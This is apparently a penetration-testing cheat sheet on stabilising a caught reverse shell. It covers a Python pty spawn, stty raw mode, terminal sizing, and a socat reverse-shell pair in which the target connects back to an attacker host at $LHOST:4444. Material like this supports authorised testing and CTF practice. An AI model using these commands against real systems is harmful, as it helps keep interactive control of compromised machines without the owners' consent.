# Python PTY Shell Stabilization

When you catch a reverse shell using Netcat (e.g. from bash, php, or netcat payloads), the shell is often non-interactive (a "dumb" shell). This means no auto-complete (tab), no history (up arrow), and pressing `Ctrl+C` will kill the shell and lose the connection.

This sequence upgrades the dumb shell to a fully interactive TTY.

## The Sequence

**1. Spawn a PTY (Inside the dumb shell)**

<!-- cmd: linux -->
```bash
# Try python3 first
python3 -c 'import pty;pty.spawn("/bin/bash")'

# If python3 is not found, try python
python -c 'import pty;pty.spawn("/bin/bash")'
```

**2. Background the shell (On your attacker machine)**

Press `Ctrl+Z` to background the netcat listener. You will drop back to your local terminal.

**3. Configure your local terminal to send raw keystrokes (Attacker machine)**

<!-- cmd: linux -->
```bash
stty raw -echo; fg
```

*(Note: after typing this, you won't see your keystrokes. Hit Enter. You might see `nc -lvnp 4444`. Hit Enter again to get the target's prompt back).*

**4. Set environment variables (Inside the stabilized shell)**

<!-- cmd: linux -->
```bash
export TERM=xterm
export SHELL=bash
```

**5. (Optional) Fix terminal dimensions**

If you run `nano` or `clear` and the screen breaks, your terminal dimensions are mismatched.

<!-- cmd: linux -->
```bash
# On your local machine (open a new tab):
stty size
# Output: 40 130 (rows columns)

# Inside the stabilized target shell:
stty rows 40 cols 130
```

## Alternatives to Python

If Python is not installed on the target, try:

### Script
<!-- cmd: linux -->
```bash
/usr/bin/script -qc /bin/bash /dev/null
# Then proceed with Ctrl+Z -> stty raw -echo; fg
```

### Socat
Upload `socat` to the target.
<!-- cmd: linux -->
```bash
# Attacker listener
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Target execution
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:4444
```

script /dev/null -c bash
export TERM=xterm-256color
reset